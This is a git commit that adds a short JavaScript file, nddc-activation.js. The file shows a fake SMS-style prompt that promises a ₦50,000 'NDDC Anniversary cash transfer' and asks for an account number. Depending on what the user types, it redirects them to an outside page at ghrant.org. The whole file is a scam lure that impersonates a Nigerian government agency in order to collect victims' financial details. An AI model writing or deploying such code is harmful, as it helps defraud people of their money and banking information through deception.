fc38f71438ea3a5e162a80e276a1a89e2d045292
mfednewblog8 <nsikakimoh68@gmail.com>
2025-10-08 14:09:59 +0100

    Create nddc-activation.js

---
+++ nddc-activation.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW ₦50,000'
+password=prompt('SMS: Congratulation. You are among the selection ones to Receive ₦50,000 NDDC Anniversary cash transfer, kindly press Ok to submit account number now ','WITHDRAW ₦50,000');
+if (password != 'WITHDRAW ₦50,000') {
+location.href='https://ghrant.org/nddc.html';
+}
